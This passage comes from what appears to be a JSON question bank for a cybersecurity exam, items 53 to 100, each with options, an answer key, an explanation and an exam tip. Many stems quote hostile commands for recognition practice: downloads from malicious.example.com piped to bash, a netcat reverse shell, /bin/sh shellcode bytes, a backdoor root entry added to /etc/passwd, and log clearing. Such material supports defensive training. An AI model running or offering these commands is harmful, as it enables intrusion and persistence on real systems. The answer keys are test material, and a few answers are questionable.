      "explanation": "The request includes `../../../../etc/shadow`, which attempts to read sensitive system files via directory traversal.",
      "examTip": "Use input validation and disable direct access to system files to prevent directory traversal attacks."
    },
    {
      "id": 54,
      "question": "An analyst is investigating an attack in which a user receives an email containing an Excel file. When opened, the file executes a hidden macro that downloads and runs malware. What type of attack is this?",
      "options": [
        "Cross-site scripting (XSS)",
        "Phishing with malicious macros",
        "Pass-the-hash attack",
        "DNS tunneling"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Malicious macros in Excel documents are a common phishing attack vector that downloads and executes malware.",
      "examTip": "Disable macros by default and train users to recognize phishing attempts."
    },
    {
      "id": 55,
      "question": "A security operations center (SOC) analyst sees an increase in traffic to port 445/TCP from multiple external IP addresses. What is the MOST likely cause?",
      "options": [
        "An attempt to exploit SMB vulnerabilities such as EternalBlue",
        "A DNS amplification attack",
        "A legitimate file transfer using SCP",
        "An SSL handshake error"
      ],
      "correctAnswerIndex": 0,
      "explanation": "SMB (port 445) is commonly targeted by attackers using EternalBlue and other exploits to gain unauthorized access.",
      "examTip": "Disable SMBv1 and restrict external access to port 445 to prevent exploitation."
    },
    {
      "id": 56,
      "question": "A security team detects the following command executed on a web server:\n\n`curl http://malicious.example.com/shell.php -o /var/www/html/backdoor.php`\n\nWhat is the likely intent of this command?",
      "options": [
        "Exfiltrating data via DNS tunneling",
        "Downloading and placing a web shell for remote access",
        "Scanning for vulnerabilities in a web application",
        "Injecting a SQL command into a database"
      ],
      "correctAnswerIndex": 1,
      "explanation": "The command downloads a malicious PHP file (`backdoor.php`), indicating a web shell installation.",
      "examTip": "Monitor web directories for unauthorized file changes and use WAFs to prevent web shell attacks."
    },
    {
      "id": 57,
      "question": "An attacker compromises a Windows server and runs the following command:\n\n`wevtutil cl Security`\n\nWhat is the attacker trying to accomplish?",
      "options": [
        "Modify the Windows firewall settings",
        "Clear the Windows event logs to cover tracks",
        "Escalate privileges using the SYSTEM account",
        "Extract password hashes from memory"
      ],
      "correctAnswerIndex": 1,
      "explanation": "The `wevtutil cl Security` command clears the security event logs, which attackers do to evade detection.",
      "examTip": "Enable event log forwarding and use SIEMs to detect log tampering."
    },
    {
      "id": 58,
      "question": "A security analyst runs the following command on a Linux server:\n\n`netstat -antp | grep 4444`\n\nWhat information is the analyst trying to obtain?",
      "options": [
        "Identifying open SMB connections",
        "Checking for an active reverse shell",
        "Scanning the local network for vulnerabilities",
        "Extracting DNS records"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Port 4444 is commonly used for reverse shells, and `netstat` is used to identify active connections.",
      "examTip": "Monitor network connections and use firewalls to block unauthorized outbound connections."
    },
    {
      "id": 59,
      "question": "An attacker exploits a vulnerability in a web application and injects the following payload:\n\n`<iframe src='javascript:alert(1)'></iframe>`\n\nWhat type of attack is being executed?",
      "options": [
        "SQL injection",
        "Stored cross-site scripting (XSS)",
        "Directory traversal",
        "Server-side request forgery (SSRF)"
      ],
      "correctAnswerIndex": 1,
      "explanation": "The injected JavaScript executes in the victim’s browser, characteristic of a stored XSS attack.",
      "examTip": "Use input sanitization and Content Security Policy (CSP) headers to mitigate XSS attacks."
    },
    {
      "id": 60,
      "question": "A penetration tester is attempting to extract password hashes from a Windows machine. Which of the following tools would be the MOST effective?",
      "options": [
        "Wireshark",
        "Mimikatz",
        "Nikto",
        "Burp Suite"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Mimikatz is commonly used to extract password hashes and credentials from Windows memory.",
      "examTip": "Enable Credential Guard and restrict administrator access to reduce Mimikatz effectiveness."
    },
    {
      "id": 61,
      "question": "A security analyst is reviewing network traffic and finds the following command executed on a compromised system:\n\n`nc -e /bin/bash 192.168.1.10 4444`\n\nWhat is the attacker trying to achieve?",
      "options": [
        "Performing a local privilege escalation",
        "Initiating a reverse shell connection",
        "Exfiltrating data using DNS tunneling",
        "Executing a denial-of-service attack"
      ],
      "correctAnswerIndex": 1,
      "explanation": "The `nc` (Netcat) command is creating a reverse shell, allowing the attacker to remotely control the compromised system.",
      "examTip": "Monitor outbound connections to detect reverse shells and block unauthorized network traffic."
    },
    {
      "id": 62,
      "question": "A penetration tester runs the following command on a Windows system:\n\n`reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk /v Start`\n\nWhat information is the tester trying to obtain?",
      "options": [
        "The startup type of the disk service",
        "List of all user accounts on the system",
        "Running processes in memory",
        "Windows firewall rules"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command queries the Windows registry to determine the startup type of the disk service, which can help identify misconfigurations.",
      "examTip": "Regularly audit registry keys for unauthorized changes to detect persistence mechanisms."
    },
    {
      "id": 63,
      "question": "A security analyst observes the following PowerShell command in a compromised system:\n\n`[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; Invoke-WebRequest -Uri 'http://malicious.example.com/payload.exe' -OutFile 'C:\\Temp\\payload.exe'`\n\nWhat is the intent of this command?",
      "options": [
        "Bypassing SSL/TLS certificate validation to download a malicious file",
        "Disabling Windows Defender on the system",
        "Creating a new administrative user",
        "Uploading local files to a remote server"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command disables SSL certificate validation and downloads a malicious file, a common technique used in malware delivery.",
      "examTip": "Monitor PowerShell execution logs and enforce script restrictions to prevent malicious execution."
    },
    {
      "id": 64,
      "question": "A security engineer detects multiple authentication attempts from different geographic locations for a single user account within a short time frame. What is the MOST likely cause?",
      "options": [
        "A brute-force attack",
        "A pass-the-hash attack",
        "An impossible travel anomaly indicating account compromise",
        "A Kerberoasting attack"
      ],
      "correctAnswerIndex": 2,
      "explanation": "An impossible travel anomaly occurs when a user's login attempts come from different locations within a timeframe that makes physical travel impossible, indicating credential compromise.",
      "examTip": "Use geolocation-based access controls and enforce MFA to mitigate account takeover risks."
    },
    {
      "id": 65,
      "question": "A forensic investigator finds the following command in a compromised Linux server's bash history:\n\n`wget http://malicious.example.com/shell.sh -O- | bash`\n\nWhat is the attacker attempting to do?",
      "options": [
        "Downloading and executing a malicious script",
        "Extracting sensitive files from the system",
        "Brute-forcing SSH credentials",
        "Performing a denial-of-service attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command downloads a script from a remote URL and immediately executes it, a common method for launching malware or backdoors.",
      "examTip": "Restrict outbound internet access for servers and monitor shell history for suspicious activity."
    },
    {
      "id": 66,
      "question": "A network administrator runs the following command on a Linux system:\n\n`iptables -A INPUT -p tcp --dport 22 -j DROP`\n\nWhat effect does this command have?",
      "options": [
        "Blocks all incoming SSH connections",
        "Drops all outgoing SSH traffic",
        "Allows only internal SSH connections",
        "Forwards SSH traffic to another system"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command adds a firewall rule to drop all incoming TCP traffic on port 22, effectively blocking SSH connections.",
      "examTip": "Use firewalls to restrict SSH access to trusted IPs and implement fail2ban to prevent brute-force attacks."
    },
    {
      "id": 67,
      "question": "An attacker successfully exploits a remote system and executes the following command:\n\n`echo 'root::0:0::/root:/bin/bash' >> /etc/passwd`\n\nWhat is the attacker trying to achieve?",
      "options": [
        "Creating a backdoor by adding a new root user",
        "Deleting all user accounts on the system",
        "Clearing system logs to evade detection",
        "Locking all user accounts"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command modifies `/etc/passwd` to add a new root user, allowing the attacker persistent access.",
      "examTip": "Monitor system file integrity and restrict access to `/etc/passwd` to prevent unauthorized modifications."
    },
    {
      "id": 68,
      "question": "A penetration tester runs the following Nmap command:\n\n`nmap -sU -p 161 <target>`\n\nWhat is the tester attempting to do?",
      "options": [
        "Enumerate SNMP services",
        "Scan for open FTP ports",
        "Detect web application vulnerabilities",
        "Perform a brute-force attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Port 161 is used for SNMP, and the command scans for open SNMP services that may be misconfigured or vulnerable.",
      "examTip": "Disable SNMP or enforce strong community strings to prevent unauthorized access."
    },
    {
      "id": 69,
      "question": "A forensic analyst is investigating a malware infection and finds that the system is making repeated HTTP requests to `http://randomstring1234.example.com/c2`. What is the MOST likely cause?",
      "options": [
        "A command-and-control (C2) communication channel",
        "A benign software update request",
        "A misconfigured DNS server",
        "A vulnerability scanner testing outbound connections"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Malware often uses HTTP requests to randomly generated subdomains to establish command-and-control (C2) communication.",
      "examTip": "Monitor DNS queries for anomalous patterns and block suspicious domains."
    },
    {
      "id": 70,
      "question": "A security analyst is reviewing logs and finds the following event:\n\n`Failed SSH login attempt from 203.0.113.10 using username 'admin'` (repeated 500 times within 5 minutes)\n\nWhat is the BEST mitigation technique?",
      "options": [
        "Implement fail2ban to block repeated failed logins",
        "Disable SSH access entirely",
        "Allow SSH access only during business hours",
        "Ignore the activity as a harmless anomaly"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Fail2ban can automatically block IP addresses after repeated failed login attempts, mitigating brute-force attacks.",
      "examTip": "Use fail2ban or SSH rate limiting to prevent brute-force login attempts."
    },
    {
      "id": 71,
      "question": "A security analyst finds the following log entry on a Linux web server:\n\n`Feb 25 14:12:45 webserver1 sudo: www-data : TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/bash`\n\nWhat does this log indicate?",
      "options": [
        "An attacker has successfully escalated privileges to root",
        "A normal system administrator action",
        "An automated web crawler executing commands",
        "A failed authentication attempt"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The log shows that the `www-data` user (typically the web server process) executed `/bin/bash` as root, indicating a privilege escalation attack.",
      "examTip": "Use the principle of least privilege (PoLP) and restrict web server processes from running as root."
    },
    {
      "id": 72,
      "question": "A penetration tester executes the following command:\n\n`echo -e '\\x90\\x90\\x90\\x90\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80' > exploit.bin`\n\nWhat is the tester attempting to do?",
      "options": [
        "Generate a shellcode payload to execute a remote shell",
        "Modify firewall rules to allow malicious traffic",
        "Extract password hashes from the system",
        "Bypass antivirus detection"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The hexadecimal shellcode represents an exploit payload designed to execute `/bin/sh`, commonly used in buffer overflow attacks.",
      "examTip": "Use stack canaries, ASLR, and DEP to mitigate buffer overflow vulnerabilities."
    },
    {
      "id": 73,
      "question": "A network administrator runs the following command on a Linux system:\n\n`tcpdump -i eth0 'port 80'`\n\nWhat is the purpose of this command?",
      "options": [
        "Capture HTTP traffic on interface eth0",
        "Filter out HTTPS traffic from logs",
        "Block HTTP traffic from being sent",
        "Generate network traffic for testing"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command captures packets on interface `eth0` that are using port 80, allowing the administrator to analyze HTTP traffic.",
      "examTip": "Use `tcpdump` with filters to analyze specific types of network traffic efficiently."
    },
    {
      "id": 74,
      "question": "A security analyst discovers a Windows system making unusual outbound connections to multiple IPs on port 53. What is the MOST likely cause?",
      "options": [
        "DNS tunneling for data exfiltration",
        "A normal DNS query resolving hostnames",
        "A misconfigured firewall rule",
        "A brute-force attack attempt"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Unusual outbound DNS traffic to multiple external IPs suggests DNS tunneling, a technique attackers use for covert data exfiltration.",
      "examTip": "Monitor DNS logs for anomalous query patterns and restrict DNS traffic to trusted servers."
    },
    {
      "id": 75,
      "question": "An attacker successfully executes the following command on a Linux system:\n\n`chmod u+s /bin/bash`\n\nWhat is the impact of this command?",
      "options": [
        "Sets the SUID bit on `/bin/bash`, allowing privilege escalation",
        "Hides the `/bin/bash` process from system logs",
        "Deletes all user accounts on the system",
        "Removes root privileges from all users"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Setting the SUID bit on `/bin/bash` allows any user to execute it with root privileges, leading to privilege escalation.",
      "examTip": "Monitor file permission changes and regularly audit system binaries for unauthorized modifications."
    },
    {
      "id": 76,
      "question": "A penetration tester executes the following Nmap command:\n\n`nmap -p- -T4 <target>`\n\nWhat is the purpose of this scan?",
      "options": [
        "Scan all 65,535 TCP ports on the target",
        "Detect vulnerabilities in web applications",
        "Perform a brute-force attack on the target",
        "Test for firewall misconfigurations"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `-p-` flag instructs Nmap to scan all TCP ports on the target, while `-T4` increases scan speed.",
      "examTip": "Use full port scans to identify non-standard services running on unusual ports."
    },
    {
      "id": 77,
      "question": "A forensic analyst is investigating a suspected malware infection and finds the following scheduled task entry:\n\n`TaskName: \\\\SystemUpdate\nNext Run Time: 3/01/2025 02:00:00 AM\nTask To Run: C:\\Windows\\Temp\\updater.exe`\n\nWhat is the MOST likely purpose of this task?",
      "options": [
        "Maintaining persistence on the compromised system",
        "Performing a legitimate Windows update",
        "Running a security patch",
        "Scanning for vulnerabilities"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Attackers often use scheduled tasks to maintain persistence by executing malware at predefined intervals.",
      "examTip": "Regularly audit scheduled tasks and investigate unexpected executables."
    },
    {
      "id": 78,
      "question": "A security analyst detects the following Base64-encoded PowerShell command:\n\n`cG93ZXJzaGVsbCAtbm9wIC1jICdzdGFydC1wcm9jZXNzIHBvd2Vyc2hlbGwuZXhlJw==`\n\nWhat is the BEST way to analyze this command?",
      "options": [
        "Decode the Base64 string and analyze the decoded command",
        "Execute the command in a sandbox environment",
        "Ignore the command unless an endpoint shows active compromise",
        "Submit the command to an antivirus vendor for analysis"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Decoding the Base64 string reveals the actual command, which is crucial for understanding its intent before execution.",
      "examTip": "Use tools like CyberChef or `echo <string> | base64 -d` in Linux to safely decode Base64 strings."
    },
    {
      "id": 79,
      "question": "An attacker gains access to a Linux server and runs the following command:\n\n`iptables -F`\n\nWhat is the result of this command?",
      "options": [
        "Flushes all firewall rules, disabling protection",
        "Blocks all incoming connections to the server",
        "Enables logging for all traffic",
        "Creates a new firewall rule allowing SSH access"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `iptables -F` command flushes all firewall rules, effectively disabling network security controls.",
      "examTip": "Monitor system logs for unexpected firewall modifications and enforce firewall persistence."
    },
    {
      "id": 80,
      "question": "Which of the following techniques is MOST effective in preventing Kerberoasting attacks?",
      "options": [
        "Enforce strong service account passwords and reduce their privileges",
        "Use only NTLM authentication",
        "Allow anonymous authentication for service accounts",
        "Disable all Kerberos authentication"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Kerberoasting exploits weak service account passwords, so enforcing strong passwords and minimizing privileges reduces risk.",
      "examTip": "Rotate service account passwords regularly and monitor Kerberos ticket requests for anomalies."
    },
    {
      "id": 81,
      "question": "A security analyst runs the following command on a compromised Linux system:\n\n`ps aux | grep nc`\n\nThe output shows:\n\n`www-data   2345  0.0  0.1  19360  3208 ?  S    14:22   0:00 nc -lvp 4444`\n\nWhat is the attacker likely doing?",
      "options": [
        "Listening for an incoming reverse shell connection",
        "Performing a network scan on port 4444",
        "Executing a denial-of-service attack",
        "Enumerating user privileges"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command `nc -lvp 4444` opens a listener on port 4444, commonly used for reverse shells.",
      "examTip": "Monitor for unauthorized netcat listeners and restrict its execution in production environments."
    },
    {
      "id": 82,
      "question": "A security analyst sees the following SIEM log entry:\n\n`Feb 26 11:34:22 server1 sshd[2048]: Accepted password for root from 192.168.1.150 port 49852 ssh2`\n\nWhat should the analyst do NEXT?",
      "options": [
        "Investigate if this login attempt is authorized",
        "Immediately disable SSH on the server",
        "Ignore the log since it is a successful login",
        "Blacklist the IP address from accessing the network"
      ],
      "correctAnswerIndex": 0,
      "explanation": "A successful root login from an unexpected IP may indicate compromise; further investigation is required.",
      "examTip": "Use key-based authentication and disable direct root SSH logins to enhance security."
    },
    {
      "id": 83,
      "question": "A penetration tester executes the following command:\n\n`ldapsearch -x -h 192.168.1.100 -b \"dc=example,dc=com\"` \n\nWhat is the tester attempting to do?",
      "options": [
        "Enumerate users and groups from an LDAP server",
        "Perform a brute-force attack against Active Directory",
        "Launch a distributed denial-of-service (DDoS) attack",
        "Execute an SQL injection"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `ldapsearch` command queries an LDAP directory, commonly used to enumerate users and groups.",
      "examTip": "Limit anonymous LDAP queries and enforce strong authentication to protect directory services."
    },
    {
      "id": 84,
      "question": "A forensic investigator analyzing a system memory dump finds references to `C:\\Windows\\Temp\\mimikatz.exe`. What is the MOST likely conclusion?",
      "options": [
        "An attacker attempted to dump credentials using Mimikatz",
        "The system was infected with ransomware",
        "The user installed a legitimate security tool",
        "The system is undergoing a normal Windows update"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Mimikatz is a tool used to extract Windows credentials from memory, indicating potential credential theft.",
      "examTip": "Enable Credential Guard and monitor execution of suspicious processes like Mimikatz."
    },
    {
      "id": 85,
      "question": "A network security analyst sees an increase in outbound HTTP traffic containing long, encoded strings in the URL parameters. What is the MOST likely cause?",
      "options": [
        "Exfiltration via command-and-control (C2) over HTTP",
        "A user accessing a cloud storage service",
        "A legitimate API request to a web application",
        "A database backup being uploaded to an external server"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Encoded data in URL parameters can indicate command-and-control (C2) traffic used for data exfiltration.",
      "examTip": "Monitor outbound traffic for unusual patterns and block suspicious C2 communications."
    },
    {
      "id": 86,
      "question": "A security analyst detects multiple failed login attempts followed by a successful login for an administrator account. The login originated from an unusual IP address. What is the MOST likely attack type?",
      "options": [
        "Credential stuffing",
        "SQL injection",
        "Pass-the-hash",
        "Man-in-the-middle attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Credential stuffing involves using leaked credentials to log in, often after multiple failed attempts.",
      "examTip": "Enforce multi-factor authentication (MFA) to mitigate credential stuffing attacks."
    },
    {
      "id": 87,
      "question": "A penetration tester discovers a web application vulnerable to command injection. Which payload would BEST confirm the vulnerability?",
      "options": [
        "`; cat /etc/passwd`",
        "`<script>alert(1)</script>`",
        "`SELECT * FROM users WHERE username = 'admin'`",
        "`../etc/shadow`"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `cat /etc/passwd` command checks if shell commands can be injected and executed by the web application.",
      "examTip": "Use web application firewalls (WAFs) and input sanitization to prevent command injection attacks."
    },
    {
      "id": 88,
      "question": "A cybersecurity analyst reviewing logs notices the following unusual DNS request pattern:\n\n`xy1.example.com`\n`zz5.example.com`\n`a9b.example.com`\n\nWhat is the MOST likely explanation?",
      "options": [
        "Malware using a Domain Generation Algorithm (DGA) for C2",
        "A user accessing multiple websites from a browser",
        "A legitimate software update process",
        "An internal DNS misconfiguration"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Randomized subdomains are a common indicator of malware using Domain Generation Algorithms (DGA) to communicate with command-and-control (C2) servers.",
      "examTip": "Use DNS filtering and machine learning to detect and block DGA-based malware."
    },
    {
      "id": 89,
      "question": "A forensic investigator finds a system configured with the following registry key:\n\n`HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\malicious.exe`\n\nWhat does this indicate?",
      "options": [
        "A persistence mechanism using registry autorun keys",
        "A misconfigured Windows update setting",
        "A temporary file used by a legitimate process",
        "An encrypted file awaiting decryption"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The Windows `Run` registry key is commonly used by malware to maintain persistence after reboots.",
      "examTip": "Regularly audit autorun registry keys and remove unauthorized entries."
    },
    {
      "id": 90,
      "question": "A network administrator detects large amounts of traffic from a single internal host to an external IP address over port 22. What is the MOST likely explanation?",
      "options": [
        "Unauthorized data exfiltration over SSH",
        "A legitimate file transfer using SCP",
        "A vulnerability scan detecting open ports",
        "A brute-force attack targeting an external system"
      ],
      "correctAnswerIndex": 0,
      "explanation": "A high volume of outbound SSH traffic suggests possible data exfiltration over an encrypted channel.",
      "examTip": "Monitor and restrict SSH traffic to prevent unauthorized data transfers."
    },
    {
      "id": 91,
      "question": "A forensic investigator finds the following process running on a compromised Windows host:\n\n`C:\\Windows\\System32\\wbem\\wmiprvse.exe -Embedding`\n\nWhat is the MOST likely explanation?",
      "options": [
        "An attacker is using WMI for lateral movement or persistence",
        "A legitimate Windows Management Instrumentation (WMI) service",
        "A kernel-level rootkit executing system commands",
        "A misconfigured software update process"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Attackers commonly use WMI (`wmiprvse.exe`) to execute remote commands, establish persistence, or move laterally.",
      "examTip": "Monitor WMI activity and restrict remote WMI execution to trusted administrators."
    },
    {
      "id": 92,
      "question": "An attacker runs the following command on a compromised Linux system:\n\n`iptables -A INPUT -p tcp --dport 22 -s 203.0.113.10 -j ACCEPT`\n\nWhat is the attacker's intent?",
      "options": [
        "Allow SSH access only from their IP for persistence",
        "Block all inbound SSH traffic",
        "Disable SSH authentication on the system",
        "Redirect SSH traffic to a malicious server"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command modifies firewall rules to allow SSH access from a specific IP, enabling persistent access.",
      "examTip": "Monitor firewall rule changes and restrict unauthorized modifications."
    },
    {
      "id": 93,
      "question": "A cybersecurity analyst reviews log entries and notices repeated failed authentication attempts followed by a successful login using a service account. What is the MOST likely explanation?",
      "options": [
        "Credential stuffing attack",
        "Kerberoasting attack",
        "Pass-the-hash attack",
        "Brute-force attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Credential stuffing occurs when attackers use previously leaked username-password combinations to gain access.",
      "examTip": "Implement multi-factor authentication (MFA) and monitor authentication anomalies."
    },
    {
      "id": 94,
      "question": "A security analyst captures the following network traffic:\n\n```\n15:21:45.124567 IP 192.168.1.20.54321 > 203.0.113.55.80: Flags [P.], seq 194:402, ack 1502, win 8192\n15:21:45.125678 IP 203.0.113.55.80 > 192.168.1.20.54321: Flags [R], seq 1502, win 0\n```\n\nWhat does this traffic pattern MOST likely indicate?",
      "options": [
        "A TCP reset attack",
        "A normal TCP handshake",
        "An ICMP flood attack",
        "A brute-force login attempt"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `RST` flag in response to an established connection suggests a TCP reset attack, often used in session hijacking.",
      "examTip": "Monitor for unusual `RST` packets in network traffic and enforce session timeouts."
    },
    {
      "id": 95,
      "question": "An attacker successfully exploits a system and executes the following command:\n\n`setspn -L compromised_admin`\n\nWhat is the attacker trying to accomplish?",
      "options": [
        "Enumerate service principal names (SPNs) for Kerberoasting",
        "Modify Active Directory group policies",
        "Add a new user to the domain administrator group",
        "Retrieve NTLM password hashes from memory"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `setspn -L` command lists service principal names (SPNs), which can be used in Kerberoasting attacks to extract service account credentials.",
      "examTip": "Monitor for unexpected `setspn` commands and use strong passwords for service accounts."
    },
    {
      "id": 96,
      "question": "An attacker successfully executes a SQL injection attack and retrieves the following response:\n\n```\nadmin | $2y$10$abcdefghij1234567890klmnopqrstuvwx\nuser1 | $2y$10$zyxwvutsrqponmlkjihgfedcba987654\n```\n\nWhat does this indicate?",
      "options": [
        "The attacker has dumped password hashes from the database",
        "The attacker has gained root access to the server",
        "The attacker has modified user roles",
        "The attacker has executed a privilege escalation attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The response contains bcrypt-hashed passwords, indicating that the attacker extracted credentials using SQL injection.",
      "examTip": "Use parameterized queries and proper database access controls to prevent SQL injection."
    },
    {
      "id": 97,
      "question": "An attacker compromises a Windows system and runs the following command:\n\n`rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"` \n\nWhat is the purpose of this command?",
      "options": [
        "Executing JavaScript in a Windows environment for code execution",
        "Dumping credentials from memory",
        "Clearing event logs to cover tracks",
        "Enabling Remote Desktop Protocol (RDP)"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This command leverages `rundll32.exe` to execute JavaScript within a Windows environment, often used in malware attacks.",
      "examTip": "Monitor suspicious `rundll32.exe` executions and restrict script execution where possible."
    },
    {
      "id": 98,
      "question": "A forensic analyst is investigating a compromised Linux system and finds the following cron job:\n\n`*/10 * * * * root /bin/bash -c 'curl http://malicious.example.com/backdoor.sh | bash'`\n\nWhat is the purpose of this cron job?",
      "options": [
        "Maintain persistence by executing a backdoor script every 10 minutes",
        "Perform a legitimate system update",
        "Disable security monitoring on the system",
        "Exfiltrate system logs to an attacker-controlled server"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The cron job downloads and executes a remote script every 10 minutes, ensuring persistence on the compromised system.",
      "examTip": "Monitor for unauthorized cron jobs and restrict write access to `/etc/crontab`."
    },
    {
      "id": 99,
      "question": "A penetration tester executes the following command:\n\n`hashcat -m 1000 -a 0 hashlist.txt wordlist.txt`\n\nWhat is the tester trying to accomplish?",
      "options": [
        "Cracking NTLM password hashes using a dictionary attack",
        "Performing a pass-the-hash attack",
        "Extracting hashes from memory",
        "Decrypting SSL/TLS traffic"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Hashcat with `-m 1000` targets NTLM hashes, and `-a 0` specifies a dictionary attack using a wordlist.",
      "examTip": "Use long, complex passwords and enable account lockout policies to mitigate password cracking attempts."
    },
    {
      "id": 100,
      "question": "A security analyst reviews network traffic logs and detects multiple outbound connections to `169.254.169.254`. What is the MOST likely cause?",
      "options": [
        "An attacker attempting to exploit cloud metadata services",
        "A normal network configuration request",
        "A botnet command-and-control communication",
        "A DNS poisoning attack in progress"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The IP `169.254.169.254` is used by cloud providers (such as AWS) for metadata services, which attackers exploit to extract credentials.",
      "examTip": "Restrict access to cloud metadata services and enforce IMDSv2 in AWS environments."
    }
  ]
});
